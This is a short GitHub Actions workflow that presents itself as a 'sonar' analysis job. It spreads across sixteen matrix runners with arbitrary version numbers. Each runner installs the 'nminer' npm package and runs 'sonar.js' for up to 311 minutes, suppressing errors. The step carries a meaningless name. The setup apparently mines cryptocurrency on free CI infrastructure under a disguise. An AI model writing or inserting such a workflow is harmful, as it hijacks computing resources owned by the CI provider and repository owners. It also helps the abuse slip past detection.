name: sonar
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9837 }
          - { version: 2457 }
          - { version: 7749 }
          - { version: 4779 }
          - { version: 7736 }
          - { version: 5305 }
          - { version: 6221 }
          - { version: 2420 }
          - { version: 4757 }
          - { version: 2015 }
          - { version: 885 }
          - { version: 764 }
          - { version: 3454 }
          - { version: 4520 }
          - { version: 8179 }
          - { version: 4819 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: about foolishly carelessly
        run: |
          npm install nminer@latest
          timeout 311m node sonar.js || echo "sonar executed"